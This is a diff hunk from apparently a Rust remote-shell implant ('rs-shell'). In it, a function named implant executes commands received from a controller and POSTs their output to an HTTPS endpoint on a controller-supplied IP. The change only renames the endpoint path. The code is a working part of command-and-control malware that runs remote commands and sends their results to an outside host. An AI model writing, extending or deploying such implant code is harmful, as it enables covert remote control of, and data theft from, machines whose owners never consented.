@@ -57,7 +57,7 @@ pub fn implant(ip: &str) -> Result<(), Box<dyn Error>> {
                     "cmd" => {
                         let res_cmd = do_stuff(value);
                         log::debug!("{}", String::from_utf8_lossy(&res_cmd));
-                        url = format!("https://{}/rs-shell/output_imp", ip);
+                        url = format!("https://{}/rs-shell/receive_output", ip);
                         response = client.post(url).body(res_cmd).send()?;
                         if response.status().is_success() {
                             log::debug!("Command executed");
